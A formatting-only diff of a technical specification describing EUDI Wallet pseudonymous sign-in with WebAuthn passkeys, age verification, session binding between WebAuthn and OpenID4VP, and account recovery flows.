-    "attestationObject": "<ArrayBuffer: CBOR-encoded {fmt, attStmt, authData}>"
+    "clientDataJSON": "&lt;ArrayBuffer: {type, challenge, origin, crossOrigin}>",
+    "attestationObject": "&lt;ArrayBuffer: CBOR-encoded {fmt, attStmt, authData}>"
   },
   "authenticatorAttachment": "platform"
 }
@@ -10873,7 +11110,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User navigates to RP and chooses "Sign in with EUDI Wallet"</strong></summary>
+<details>
+<summary><strong>1. User navigates to RP and chooses "Sign in with EUDI Wallet"</strong></summary>
 
 The User visits the Relying Party's website and opts to register or sign in using their EUDI Wallet rather than creating a traditional password-based account. The RP's login page should present the EUDI Wallet option alongside traditional login methods (per ARF HLR PA_01 — Wallet Units SHALL support pseudonym creation during online presentation flows). The RP detects whether the browser supports `navigator.credentials.create()` (WebAuthn L3 §6.1) before offering this option; if not supported, the RP falls back to a QR-code-based credential presentation flow (§10) instead.
 
@@ -10882,7 +11120,8 @@ The User visits the Relying Party's website and opts to register or sign in usin
 **Audit Telemetry:** The Relying Party logs a `PSEUDONYM_REGISTRATION_INITIATED` event.
 
 </details>
-<details><summary><strong>2. RP Server sends PublicKeyCredentialCreationOptions to Browser</strong></summary>
+<details>
+<summary><strong>2. RP Server sends PublicKeyCredentialCreationOptions to Browser</strong></summary>
 
 The RP's backend generates a WebAuthn registration challenge and sends it to the browser via the JavaScript WebAuthn API (WebAuthn L3 §6.1.3). The payload defines the RP identity, an internal user handle, and a cryptographically random challenge:
 
@@ -10919,7 +11158,8 @@ The key parameters are documented in §16.5.1. Notably, `alg: -7` (ES256 / P-256
 **Artifact Produced:** `PublicKeyCredentialCreationOptions` (JSON Payload)
 
 </details>
-<details><summary><strong>3. Browser verifies rp.id matches current origin</strong></summary>
+<details>
+<summary><strong>3. Browser verifies rp.id matches current origin</strong></summary>
 
 The browser performs the WebAuthn origin validation check (WebAuthn L3 §6.1.4, step 7): it verifies that the `rp.id` in the `PublicKeyCredentialCreationOptions` is a registrable domain suffix of the page's effective origin. For example, if the User is visiting `https://forum.example.com/login`, then `rp.id: "forum.example.com"` passes but `rp.id: "evil.com"` is rejected. This is the primary phishing defence — it prevents a malicious site from requesting a credential scoped to a different domain.
 
@@ -10928,14 +11168,16 @@ The browser performs the WebAuthn origin validation check (WebAuthn L3 §6.1.4, 
 **Audit Telemetry:** The Relying Party logs a `WEBAUTHN_ORIGIN_VALIDATION_FAILED` security event if the client reports an aborted configuration.
 
 </details>
-<details><summary><strong>4. Browser forwards WebAuthn creation request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>4. Browser forwards WebAuthn creation request to Wallet Unit</strong></summary>
 
 The browser invokes the platform authenticator — in this case, the EUDI Wallet Unit — via the WebAuthn Authenticator API (WebAuthn L3 §7.3.2, `authenticatorMakeCredential`). The browser passes the `rpEntity`, `userEntity`, `credTypesAndPubKeyAlgs`, and the `hash` of `clientDataJSON` to the authenticator. The Wallet Unit acts as a **platform authenticator** (`authenticatorAttachment: "platform"`), meaning it runs on the same device as the browser rather than over USB/NFC/BLE.
 
 > **EUDI-specific note**: The Wallet Unit's authenticator role is distinct from its WSCA/WSCD role. Pseudonym key pairs are managed by the **OS-level keystore** (Android Keystore / iOS Secure Enclave), not by the WSCA/WSCD used for PID and attestation credentials (§16.4). This separation ensures that pseudonym operations do not require interaction with the eIDAS trust infrastructure.
 
 </details>
-<details><summary><strong>5. Wallet Unit prompts User to register passkey</strong></summary>
+<details>
+<summary><strong>5. Wallet Unit prompts User to register passkey</strong></summary>
 
 The Wallet Unit displays a system-level consent dialogue presenting the RP's identity (`rp.name` from the creation options) and asking the User to confirm creation of a new passkey. The prompt typically reads: *"Create a passkey for forum.example.com?"*. The Wallet Unit must display the verified `rp.id`, not just the `rp.name`, to prevent social engineering attacks where a malicious RP sets a misleading `rp.name` (e.g., `"Your Bank"`) while the `rp.id` is a different domain.
 
@@ -10944,7 +11186,8 @@ The Wallet Unit displays a system-level consent dialogue presenting the RP's ide
 **Audit Telemetry:** The Wallet Unit logs a `PASSKEY_CREATION_CONSENT_DENIED` event.
 
 </details>
-<details><summary><strong>6. User approves and authenticates via biometric or PIN</strong></summary>
+<details>
+<summary><strong>6. User approves and authenticates via biometric or PIN</strong></summary>
 
 The User authorises the credential creation via local user verification — typically a biometric gesture (fingerprint, face) or device PIN/pattern. This satisfies the `userVerification: "required"` constraint from step 2. The authentication happens at the **OS level** (Android BiometricPrompt / iOS LAContext), not via the WSCA/WSCD used for eIDAS attestation credentials — pseudonym key operations deliberately avoid the eIDAS trust chain to maintain the separation between pseudonymous and identified interactions (§16.4).
 
@@ -10953,7 +11196,8 @@ The User authorises the credential creation via local user verification — typi
 **Audit Telemetry:** The Wallet Unit logs a `LOCAL_USER_AUTHENTICATION_FAILED` event upon OS maximum retry threshold.
 
 </details>
-<details><summary><strong>7. Wallet Unit generates EC P-256 key pair scoped to rp.id</strong></summary>
+<details>
+<summary><strong>7. Wallet Unit generates EC P-256 key pair scoped to rp.id</strong></summary>
 
 The Wallet Unit generates a fresh ECDSA P-256 key pair (`alg: -7` / ES256) inside the device's hardware-backed keystore (Android StrongBox / iOS Secure Enclave). The private key is **non-exportable** — it never leaves the secure hardware and is bound to the combination of `rp.id` + `user.id` (WebAuthn L3 §7.3.2, step 3). This scoping is the mechanism that enforces ARF HLR PA_04: *"Pseudonyms SHALL be unique per Relying Party"* — the same Wallet Unit generates a different, unlinkable key pair for every RP, making cross-site tracking via credential ID impossible.
 
@@ -10962,7 +11206,8 @@ The Wallet Unit generates a fresh ECDSA P-256 key pair (`alg: -7` / ES256) insid
 **Artifact Produced:** `EC P-256 Key Pair` (Hardware-Bound, Non-Exportable)
 
 </details>
-<details><summary><strong>8. Wallet Unit returns PublicKeyCredential to Browser</strong></summary>
+<details>
+<summary><strong>8. Wallet Unit returns PublicKeyCredential to Browser</strong></summary>
 
 The Wallet Unit constructs and returns a `PublicKeyCredential` object (WebAuthn L3 §6.1.3, step 20) containing the newly created credential:
 
@@ -10970,10 +11215,10 @@ The Wallet Unit constructs and returns a `PublicKeyCredential` object (WebAuthn 
 {
   "id": "dGVzdC1jcmVkZW50aWFsLWlk",
   "type": "public-key",
-  "rawId": "<ArrayBuffer: credential ID>",
+  "rawId": "&lt;ArrayBuffer: credential ID>",
   "response": {
-    "clientDataJSON": "<ArrayBuffer: {type, challenge, origin, crossOrigin}>",
-    "attestationObject": "<ArrayBuffer: CBOR-encoded {fmt, attStmt, authData}>"
+    "clientDataJSON": "&lt;ArrayBuffer: {type, challenge, origin, crossOrigin}>",
+    "attestationObject": "&lt;ArrayBuffer: CBOR-encoded {fmt, attStmt, authData}>"
   },
   "authenticatorAttachment": "platform"
 }
@@ -10984,12 +11229,14 @@ The `attestationObject` is CBOR-encoded and contains the `authData` field (WebAu
 **Artifact Produced:** `PublicKeyCredential` (JSON Object with CBOR-encoded elements)
 
 </details>
-<details><summary><strong>9. Browser forwards credential to RP Server</strong></summary>
+<details>
+<summary><strong>9. Browser forwards credential to RP Server</strong></summary>
 
 The browser serialises the `PublicKeyCredential` and transmits it to the RP's backend, typically via a `POST` to a `/webauthn/register` endpoint. The browser includes the `clientDataJSON` (which the RP will parse to verify the `challenge`, `origin`, and `type` fields) and the raw `attestationObject`. The RP's transport layer should use TLS 1.3 to protect the credential in transit — though the credential itself is not secret (it contains only the public key), integrity protection prevents tampering with the `challenge` binding.
 
 </details>
-<details><summary><strong>10. RP Server verifies attestation and stores public key</strong></summary>
+<details>
+<summary><strong>10. RP Server verifies attestation and stores public key</strong></summary>
 
 The RP's backend performs the WebAuthn registration verification procedure (WebAuthn L3 §8.1):
 
@@ -11006,12 +11253,14 @@ The RP's backend performs the WebAuthn registration verification procedure (WebA
 **Audit Telemetry:** If verification fails, the RP Server MUST reject the registration and log a `WEBAUTHN_ATTESTATION_VERIFICATION_FAILED` security alert. On success, the RP Server logs a `PSEUDONYM_CREDENTIAL_REGISTERED` event.
 
 </details>
-<details><summary><strong>11. User returns to RP in a later session</strong></summary>
+<details>
+<summary><strong>11. User returns to RP in a later session</strong></summary>
 
 In a subsequent session (hours, days, or months later), the User returns to the Relying Party's website and wants to log in pseudonymously. The RP's login page detects that the browser supports WebAuthn and offers a "Sign in with passkey" button. Since the credential was created as a discoverable credential (`residentKey: "required"` in step 2), the RP does **not** need to know the User's `credentialId` in advance — the authenticator will look it up automatically by `rp.id`.
 
 </details>
-<details><summary><strong>12. RP Server sends PublicKeyCredentialRequestOptions to Browser</strong></summary>
+<details>
+<summary><strong>12. RP Server sends PublicKeyCredentialRequestOptions to Browser</strong></summary>
 
 The RP's backend generates an authentication challenge and sends it to the browser via `navigator.credentials.get()` (WebAuthn L3 §6.1.4):
 
@@ -11033,7 +11282,8 @@ Note the absence of `allowCredentials` — since the credential is discoverable 
 **Artifact Produced:** `PublicKeyCredentialRequestOptions` (JSON Payload)
 
 </details>
-<details><summary><strong>13. Browser forwards assertion request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>13. Browser forwards assertion request to Wallet Unit</strong></summary>
 
 The browser performs the same origin validation as in step 3 (verifying `rpId` is a registrable domain suffix of the current origin), then invokes the platform authenticator via `authenticatorGetAssertion` (WebAuthn L3 §7.3.3). The browser passes the `rpId` and the SHA-256 hash of `clientDataJSON` (containing the challenge) to the Wallet Unit.
 
@@ -11042,7 +11292,8 @@ The browser performs the same origin validation as in step 3 (verifying `rpId` i
 **Audit Telemetry:** If the authenticator returns a null lookup, the Wallet Unit logs a `NO_DISCOVERABLE_CREDENTIAL_FOUND` event.
 
 </details>
-<details><summary><strong>14. User selects pseudonym and authenticates via biometric or PIN</strong></summary>
+<details>
+<summary><strong>14. User selects pseudonym and authenticates via biometric or PIN</strong></summary>
 
 The Wallet Unit searches its credential store for all discoverable credentials matching the `rpId` (WebAuthn L3 §7.3.3, step 4). If multiple pseudonyms exist for this RP (e.g., the User registered separate pseudonyms for different purposes), the Wallet presents a selection dialogue. The User picks the desired pseudonym and authenticates via biometric or PIN to satisfy `userVerification: "required"`.
 
@@ -11050,7 +11301,8 @@ The Wallet Unit searches its credential store for all discoverable credentials m
 
 
 </details>
-<details><summary><strong>15. Wallet Unit signs challenge with private key for this rp.id</strong></summary>
+<details>
+<summary><strong>15. Wallet Unit signs challenge with private key for this rp.id</strong></summary>
 
 The Wallet Unit constructs the `authenticatorData` (WebAuthn L3 §7.1): the `rpIdHash` (SHA-256 of `rpId`), flags (UP=1, UV=1), and an incremented `signCount`. It then computes `signature = ECDSA-P256-SHA256(authenticatorData || clientDataHash)` using the private key from the hardware keystore (WebAuthn L3 §7.3.3, step 8). The signature is in the DER-encoded ASN.1 format specified by ECDSA (RFC 6979).
 
@@ -11059,7 +11311,8 @@ The Wallet Unit constructs the `authenticatorData` (WebAuthn L3 §7.1): the `rpI
 **Artifact Produced:** `ECDSA P-256 Signature` (DER-encoded ASN.1 over `authenticatorData || clientDataHash`)
 
 </details>
-<details><summary><strong>16. Wallet Unit returns AuthenticatorAssertionResponse to Browser</strong></summary>
+<details>
+<summary><strong>16. Wallet Unit returns AuthenticatorAssertionResponse to Browser</strong></summary>
 
 The Wallet Unit returns the `AuthenticatorAssertionResponse` object (WebAuthn L3 §6.2.2) to the browser:
 
@@ -11068,10 +11321,10 @@ The Wallet Unit returns the `AuthenticatorAssertionResponse` object (WebAuthn L3
   "id": "dGVzdC1jcmVkZW50aWFsLWlk",
   "type": "public-key",
   "response": {
-    "authenticatorData": "<ArrayBuffer: rpIdHash(32) || flags(1) || signCount(4)>",
-    "clientDataJSON": "<ArrayBuffer: {type: 'webauthn.get', challenge, origin}>",
-    "signature": "<ArrayBuffer: DER-encoded ECDSA signature>",
-    "userHandle": "<ArrayBuffer: user.id from registration>"
+    "authenticatorData": "&lt;ArrayBuffer: rpIdHash(32) || flags(1) || signCount(4)>",
+    "clientDataJSON": "&lt;ArrayBuffer: {type: 'webauthn.get', challenge, origin}>",
+    "signature": "&lt;ArrayBuffer: DER-encoded ECDSA signature>",
+    "userHandle": "&lt;ArrayBuffer: user.id from registration>"
   }
 }
 ```
@@ -11081,13 +11334,15 @@ The `userHandle` field contains the `user.id` that the RP assigned during regist
 **Artifact Produced:** `AuthenticatorAssertionResponse` (JSON Payload with CBOR/DER arrays)
 
 </details>
-<details><summary><strong>17. Browser forwards signed assertion to RP Server</strong></summary>
+<details>
+<summary><strong>17. Browser forwards signed assertion to RP Server</strong></summary>
 
 The browser serialises the `AuthenticatorAssertionResponse` and transmits it to the RP's backend, typically via a `POST` to a `/webauthn/authenticate` endpoint. The transmission includes the `clientDataJSON`, `authenticatorData`, `signature`, and `userHandle`. As with registration (step 9), the transport should use TLS 1.3, though the assertion payload contains no secrets — it is a challenge-response proof of possession.
 
 
 </details>
-<details><summary><strong>18. RP Server verifies signature against stored public key</strong></summary>
+<details>
+<summary><strong>18. RP Server verifies signature against stored public key</strong></summary>
 
 The RP's backend performs the WebAuthn authentication verification procedure (WebAuthn L3 §8.2):
 
@@ -11104,7 +11359,8 @@ The RP's backend performs the WebAuthn authentication verification procedure (We
 **Audit Telemetry:** The RP Server MUST log a `WEBAUTHN_ASSERTION_VERIFICATION_FAILED` event upon any signature or challenge mismatch. A `CLONED_AUTHENTICATOR_DETECTED` critical alert is mandated if the received `signCount` is lower than the stored value.
 
 </details>
-<details><summary><strong>19. RP Server authenticates User as pseudonym (no real identity)</strong></summary>
+<details>
+<summary><strong>19. RP Server authenticates User as pseudonym (no real identity)</strong></summary>
 
 Having verified the signature, the RP creates an authenticated session for the User under their pseudonym. The session is bound to the opaque `user.id` and `credentialId` — the RP has **no access to the User's PID, legal name, date of birth, or any other attributable identity data**. The pseudonym is unlinkable across RPs by design: each RP gets a unique key pair (PA_04), and the `credentialId` is RP-scoped. Even if two RPs collude, they cannot correlate their pseudonymous users unless the User voluntarily performs a cross-site identity linkage (§16.8).
 
@@ -11155,14 +11411,16 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User visits age-gated platform</strong></summary>
+<details>
+<summary><strong>1. User visits age-gated platform</strong></summary>
 
 The User visits an age-gated content platform (e.g., streaming service), triggering the onboarding flow that requires both a durable account identifier and age verification.
 
 **Audit Telemetry:** The Relying Party logs an `AGE_GATED_ONBOARDING_INITIATED` event.
 
 </details>
-<details><summary><strong>2. RP Server requests pseudonym + age_over_18</strong></summary>
+<details>
+<summary><strong>2. RP Server requests pseudonym + age_over_18</strong></summary>
 
 The Relying Party requests both a persistent pseudonym and the `age_over_18` attribute via a combined DCQL and WebAuthn flow.
 
@@ -11171,7 +11429,8 @@ The Relying Party requests both a persistent pseudonym and the `age_over_18` att
 **Artifact Produced:** `Combined Authorization Request` (Integrating WebAuthn ceremony within the same TLS session)
 
 </details>
-<details><summary><strong>3. Wallet Unit presents pseudonym and SD-JWT VC</strong></summary>
+<details>
+<summary><strong>3. Wallet Unit presents pseudonym and SD-JWT VC</strong></summary>
 
 The Wallet Unit presents both the newly generated pseudonym credential AND an SD-JWT VC with `age_over_18` selectively disclosed, ensuring data minimisation.
 
@@ -11180,7 +11439,8 @@ The Wallet Unit presents both the newly generated pseudonym credential AND an SD
 **Artifact Produced:** `SD-JWT VC Presentation` combined with `PublicKeyCredential`
 
 </details>
-<details><summary><strong>4. RP Server creates account linked to pseudonym</strong></summary>
+<details>
+<summary><strong>4. RP Server creates account linked to pseudonym</strong></summary>
 
 The Relying Party evaluates the presentation, verifies the age attribute, and creates a durable account linked solely to the pseudonym, permanently flagging the account as age-verified without storing any underlying personal data.
 
@@ -11189,7 +11449,8 @@ The Relying Party evaluates the presentation, verifies the age attribute, and cr
 **Artifact Produced:** `Bound Account Record` (Database specific: Identity=Pseudonym, Age_Verified=True)
 
 </details>
-<details><summary><strong>5. User authenticates in subsequent sessions</strong></summary>
+<details>
+<summary><strong>5. User authenticates in subsequent sessions</strong></summary>
 
 For any subsequent logins, the User authenticates using only the WebAuthn pseudonym credential; no further attributes are needed because the account is already verified.
 
@@ -11275,7 +11536,8 @@ sequenceDiagram
     Note right of RP: Session binds both ceremonies<br/>to the same User
 ```
 
-<details><summary><strong>1. RP Server creates session with embedded challenge</strong></summary>
+<details>
+<summary><strong>1. RP Server creates session with embedded challenge</strong></summary>
 
 The RP Server generates a cryptographic session that will bind both ceremonies together. Two artifacts are created:
 
@@ -11300,7 +11562,8 @@ The short TTL (5 minutes) ensures temporal proximity — both ceremonies must co
 **Artifact Produced:** `Session Token` (HTTP-only) and `challenge_R`
 
 </details>
-<details><summary><strong>2. Browser initiates WebAuthn registration via navigator.credentials.create()</strong></summary>
+<details>
+<summary><strong>2. Browser initiates WebAuthn registration via navigator.credentials.create()</strong></summary>
 
 The Browser calls `navigator.credentials.create()` with the RP Server's challenge. The `challenge` field contains `challenge_R` — the same value that will later appear in the OpenID4VP nonce:
 
@@ -11333,7 +11596,8 @@ The authenticator (WSCA/platform authenticator) generates a new P-256 key pair, 
 **Artifact Produced:** `PublicKeyCredentialCreationOptions` (Client-Side JS execution)
 
 </details>
-<details><summary><strong>3. Browser forwards PublicKeyCredential to RP Server</strong></summary>
+<details>
+<summary><strong>3. Browser forwards PublicKeyCredential to RP Server</strong></summary>
 
 The Browser receives the WebAuthn registration response from the authenticator and forwards the `PublicKeyCredential` object to the RP Server. This response payload contains:
 
@@ -11360,7 +11624,8 @@ The Browser stores this credential in the platform WebAuthn manager, scoped to t
 **Artifact Produced:** `PublicKeyCredential` response payload
 
 </details>
-<details><summary><strong>4. RP Server stores WebAuthn credential in session</strong></summary>
+<details>
+<summary><strong>4. RP Server stores WebAuthn credential in session</strong></summary>
 
 The RP Server receives the `PublicKeyCredential`, verifies the attestation response (even with `attestation: "none"`, the RP must validate the `clientDataJSON.challenge` matches `challenge_R`), and extracts the public key. The credential is stored in the session — not yet persisted to the user database, because the binding is incomplete until the OpenID4VP ceremony confirms the user's verified attributes.
 
@@ -11385,7 +11650,8 @@ The session transitions to `PSEUDONYM_REGISTERED` state, indicating that the fir
 **Artifact Produced:** `In-Flight Session State` (`PSEUDONYM_REGISTERED`)
 
 </details>
-<details><summary><strong>5. RP Server sends OpenID4VP Authorization Request with challenge-embedded nonce</strong></summary>
+<details>
+<summary><strong>5. RP Server sends OpenID4VP Authorization Request with challenge-embedded nonce</strong></summary>
 
 The RP Server constructs an OpenID4VP Authorization Request, crucially embedding `challenge_R` as the `nonce` parameter. This is the binding mechanism — the Wallet's response will contain a KB-JWT whose `nonce` claim must match the WebAuthn challenge, proving both ceremonies were initiated by the same server-side transaction.
 
@@ -11417,7 +11683,8 @@ The `dcql_query` requests only `age_over_18` — the minimum attribute needed fo
 **Artifact Produced:** `OpenID4VP Authorization Request` (JSON Payload) with `nonce` bound to WebAuthn challenge
 
 </details>
-<details><summary><strong>6. Browser returns vp_token with SD-JWT VC presentation</strong></summary>
+<details>
+<summary><strong>6. Browser returns vp_token with SD-JWT VC presentation</strong></summary>
 
 The Wallet presents the SD-JWT VC containing the `age_over_18` claim. The presentation includes a Key Binding JWT (KB-JWT) whose `nonce` field echoes the challenge:
 
@@ -11432,7 +11699,8 @@ The KB-JWT payload contains `"nonce": "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEj
 **Artifact Produced:** `vp_token` encompassing `SD-JWT VC` and `KB-JWT` (Nonce=challenge_R)
 
 </details>
-<details><summary><strong>7. RP Server verifies nonce match and completes session binding</strong></summary>
+<details>
+<summary><strong>7. RP Server verifies nonce match and completes session binding</strong></summary>
 
 The RP Server performs the critical binding verification:
 
@@ -11599,19 +11867,22 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User visits RP on new device</strong></summary>
+<details>
+<summary><strong>1. User visits RP on new device</strong></summary>
 
 The User arrives at the Relying Party service from a new device but lacks the device-bound passkey required for standard authentication. The RP detects the failure or absence of a credential and explicitly offers a "Recover account" option.
 
 </details>
-<details><summary><strong>2. RP Server offers "Recover Account" option</strong></summary>
+<details>
+<summary><strong>2. RP Server offers "Recover Account" option</strong></summary>
 
 The RP detects that the User's session lacks a valid device-bound passkey. Instead of rejecting the authentication attempt outright, the RP presents an explicit "Recover Account" option in the user interface, guiding the User through a re-verification flow using their EUDI Wallet.
 
 **Audit Telemetry:** The RP Server logs an `ACCOUNT_RECOVERY_INITIATED` event.
 
 </details>
-<details><summary><strong>3. RP Server requests identity verification via DCQL</strong></summary>
+<details>
+<summary><strong>3. RP Server requests identity verification via DCQL</strong></summary>
 
 To recover the account safely, the RP launches an OpenID4VP DCQL query requesting the same PID attributes that were used for the original KYC step-up (if the account had a verified identity) or a broader set to ensure identity continuity.
 
@@ -11620,14 +11891,16 @@ To recover the account safely, the RP launches an OpenID4VP DCQL query requestin
 **Artifact Produced:** `OpenID4VP DCQL Authorization Request` (JSON Payload)
 
 </details>
-<details><summary><strong>4. Wallet Unit presents PID attributes</strong></summary>
+<details>
+<summary><strong>4. Wallet Unit presents PID attributes</strong></summary>
 
 The Wallet Unit securely presents the requested PID attributes. The RP evaluates the presentation and cryptographically matches the attributes against the existing account's verification record, assuring it is the same User.
 
 **Artifact Produced:** `SD-JWT VC Presentation`
 
 </details>
-<details><summary><strong>5. RP Server validates presentation and matches existing account</strong></summary>
+<details>
+<summary><strong>5. RP Server validates presentation and matches existing account</strong></summary>
 
 The RP Server validates the cryptographic presentation (signature, nonce, audience) and then executes an account lookup against its user store, matching the received PID attributes (e.g., `personal_identifier`, `family_name`, `birth_date`) against the verification record from the original account creation. If a match is found, the RP confirms identity continuity.
 
@@ -11636,17 +11909,20 @@ The RP Server validates the cryptographic presentation (signature, nonce, audien
 **Audit Telemetry:** On success, the RP Server logs a `RECOVERY_IDENTITY_MATCHED` event.
 
 </details>
-<details><summary><strong>6. RP Server initiates new WebAuthn registration</strong></summary>
+<details>
+<summary><strong>6. RP Server initiates new WebAuthn registration</strong></summary>
 
 Having proven the User's identity, the RP initiates a fresh WebAuthn registration ceremony. The User creates a completely new device-bound passkey on their new apparatus which is securely bound to the existing account.
 
 </details>
-<details><summary><strong>7. Wallet returns new bound passkey</strong></summary>
+<details>
+<summary><strong>7. Wallet returns new bound passkey</strong></summary>
 
 The User's new device creates a fresh FIDO2 credential using the platform authenticator (Touch ID, Face ID, Android Biometric). The Wallet returns the new `PublicKeyCredential` containing the `credentialId` and public key, bound to the RP's `rp.id` domain.
 
 </details>
-<details><summary><strong>8. RP Server invalidates old credential and stores new</strong></summary>
+<details>
+<summary><strong>8. RP Server invalidates old credential and stores new</strong></summary>
 
 The backend securely revokes the old `credential_id` preventing it from being misused by whoever found the lost device, while permanently committing the new credential for subsequent logins.
 
@@ -11761,13 +12037,15 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User visits marketplace and chooses "Sign up with Wallet"</strong></summary>
+<details>
+<summary><strong>1. User visits marketplace and chooses "Sign up with Wallet"</strong></summary>
 
 The User navigates to an online marketplace that offers EUDI Wallet integration. The marketplace's registration page presents multiple sign-up options: email/password, social login, and "Sign up with EUDI Wallet". The Wallet option promises frictionless, pseudonymous account creation — no email required, no personal data collected. The marketplace is classified as a sector where legal identification is **not** required (§16.4), so pseudonym acceptance is mandatory under Art. 5b(9). The RP detects WebAuthn support via `PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()` before offering the option.
 
 
 </details>
-<details><summary><strong>2. RP Server sends WebAuthn registration options to Browser</strong></summary>
+<details>
+<summary><strong>2. RP Server sends WebAuthn registration options to Browser</strong></summary>
 
 The RP initiates a WebAuthn `create()` ceremony by generating `PublicKeyCredentialCreationOptions`. The options include the RP's identifier (`rp.id`), a unique `user.id` (opaque handle), and a fresh `challenge_R` (cryptographic random nonce). This follows the standard WebAuthn registration flow documented in §16.5.1, but with a key difference: the account will be created at **LoA Low** with no identity verification.
 
@@ -11776,38 +12054,44 @@ The RP initiates a WebAuthn `create()` ceremony by generating `PublicKeyCredenti
 **Artifact Produced:** `PublicKeyCredentialCreationOptions` (Client-Side JSON)
 
 </details>
-<details><summary><strong>3. Browser forwards credential creation request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>3. Browser forwards credential creation request to Wallet Unit</strong></summary>
 
 The browser receives the `PublicKeyCredentialCreationOptions` and forwards the request to the Wallet Unit via the platform's WebAuthn API. On platforms where the Wallet Unit is registered as a platform authenticator, this triggers a direct invocation. The request includes the RP's origin, which the Wallet Unit will verify before proceeding.
 
 
 </details>
-<details><summary><strong>4. Wallet Unit prompts User for approval and biometric/PIN</strong></summary>
+<details>
+<summary><strong>4. Wallet Unit prompts User for approval and biometric/PIN</strong></summary>
 
 The Wallet Unit displays a consent prompt: *"Create a passkey for marketplace.example.com?"*. The User approves and authenticates via biometric (Face ID, fingerprint) or device PIN. This user verification step ensures that only the legitimate device owner can create credentials bound to this Wallet Unit.
 
 
 </details>
-<details><summary><strong>5. Wallet Unit generates key pair scoped to RP's origin</strong></summary>
+<details>
+<summary><strong>5. Wallet Unit generates key pair scoped to RP's origin</strong></summary>
 
 The Wallet Unit generates a new asymmetric key pair (typically P-256 ECDSA). The private key is scoped to the RP's `rp.id` — it cannot be used to authenticate to any other RP, preventing cross-RP correlation. The key is stored in the Wallet Unit's secure enclave/TEE, wrapped with the device's hardware-backed keystore. No identity attributes are requested or collected.
 
 
 </details>
-<details><summary><strong>6. Wallet Unit returns PublicKeyCredential to Browser</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit returns PublicKeyCredential to Browser</strong></summary>
 
 The Wallet Unit returns a `PublicKeyCredential` object containing the `credentialId` (unique identifier for this credential) and the `publicKey` (COSE-encoded). The private key never leaves the Wallet Unit. The credential also includes an `attestationObject` and `clientDataJSON` that the RP will verify to ensure the credential was genuinely created by this authenticator.
 
 **Artifact Produced:** `PublicKeyCredential` (JSON payload)
 
 </details>
-<details><summary><strong>7. Browser forwards credential to RP Server</strong></summary>
+<details>
+<summary><strong>7. Browser forwards credential to RP Server</strong></summary>
 
 The browser POSTs the `PublicKeyCredential` to the RP's WebAuthn registration endpoint. The payload is JSON-serialized from the browser's `navigator.credentials.create()` response. The RP's origin is verified by the browser before the credential is forwarded, preventing MITM attacks during the registration flow.
 
 
 </details>
-<details><summary><strong>8. RP Server stores credential with LoA Low assurance level</strong></summary>
+<details>
+<summary><strong>8. RP Server stores credential with LoA Low assurance level</strong></summary>
 
 The RP verifies the WebAuthn attestation and stores the credential with the following account metadata:
 
@@ -11829,45 +12113,52 @@ No identity attributes are requested or presented — the User's account is pure
 **Artifact Produced:** `LoA Low Account Record` (`identity_verified: false`, stored in RP DB)
 
 </details>
-<details><summary><strong>9. User returns to marketplace and initiates login (days later)</strong></summary>
+<details>
+<summary><strong>9. User returns to marketplace and initiates login (days later)</strong></summary>
 
 The User returns to the marketplace after some days. The marketplace's login page offers "Sign in with passkey" as an option. The User clicks this button, triggering the WebAuthn `get()` ceremony. This is a **pseudonymous authentication** — no email, no password, just the passkey created during Phase 1.
 
 
 </details>
-<details><summary><strong>10. RP Server sends WebAuthn assertion request to Browser</strong></summary>
+<details>
+<summary><strong>10. RP Server sends WebAuthn assertion request to Browser</strong></summary>
 
 The RP generates `PublicKeyCredentialRequestOptions` containing the RP's `rpId` and a fresh `challenge_A1` (cryptographic random nonce). The RP may include `allowCredentials` if it knows which credentials the User previously registered, or omit it for a "discoverable credential" (passkey) flow where the User selects from credentials stored on the device.
 
 **Artifact Produced:** `PublicKeyCredentialRequestOptions` (Client-Side JSON with challenge_A1)
 
 </details>
-<details><summary><strong>11. Browser forwards assertion request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>11. Browser forwards assertion request to Wallet Unit</strong></summary>
 
 The browser receives the `PublicKeyCredentialRequestOptions` and forwards the request to the Wallet Unit via the platform's WebAuthn API. The Wallet Unit identifies which stored credentials match the RP's `rpId` and prepares to prompt the User for authentication.
 
 
 </details>
-<details><summary><strong>12. Wallet Unit prompts User for biometric/PIN</strong></summary>
+<details>
+<summary><strong>12. Wallet Unit prompts User for biometric/PIN</strong></summary>
 
 The Wallet Unit prompts the User to authenticate via biometric (Face ID, fingerprint) or device PIN. This user verification step proves the User's presence and consent to this authentication. The Wallet Unit ensures the User knows which RP they are authenticating to (marketplace.example.com).
 
 
 </details>
-<details><summary><strong>13. Wallet Unit returns signed assertion to Browser</strong></summary>
+<details>
+<summary><strong>13. Wallet Unit returns signed assertion to Browser</strong></summary>
 
 The Wallet Unit uses the stored private key to sign the challenge (`challenge_A1`), creating an assertion. The assertion includes the `credentialId`, `authenticatorData` (containing the RP's origin hash and flags), and `signature`. The private key never leaves the secure enclave; only the signed output is returned.
 
 **Artifact Produced:** `AuthenticatorAssertionResponse` (ECDSA P-256 Signature)
 
 </details>
-<details><summary><strong>14. Browser forwards assertion to RP Server</strong></summary>
+<details>
+<summary><strong>14. Browser forwards assertion to RP Server</strong></summary>
 
 The browser POSTs the `PublicKeyCredential` assertion to the RP's WebAuthn authentication endpoint. The payload includes the signed challenge, allowing the RP to verify that the User controls the private key associated with the stored credential.
 
 
 </details>
-<details><summary><strong>15. RP Server verifies assertion and grants LoA Low access</strong></summary>
+<details>
+<summary><strong>15. RP Server verifies assertion and grants LoA Low access</strong></summary>
 
 The RP verifies the signature using the stored public key, validates the `authenticatorData` (origin, `signCount` for clone detection), and checks the `challenge_A1` matches the expected value. Upon successful verification, the RP grants access. Because the account has `identity_verified: false`, the RP treats this session at **LoA Low** — the User can browse, purchase low-value items, leave reviews, and perform any action that does not require identity verification. For the marketplace, this might mean limiting the User to buying (not selling), or capping transaction values.
 
@@ -11878,20 +12169,23 @@ The RP verifies the signature using the stored public key, validates the `authen
 **Artifact Produced:** `LoA Low Session Token` (Cookie / Bearer Token tied to pseudonymous account)
 
 </details>
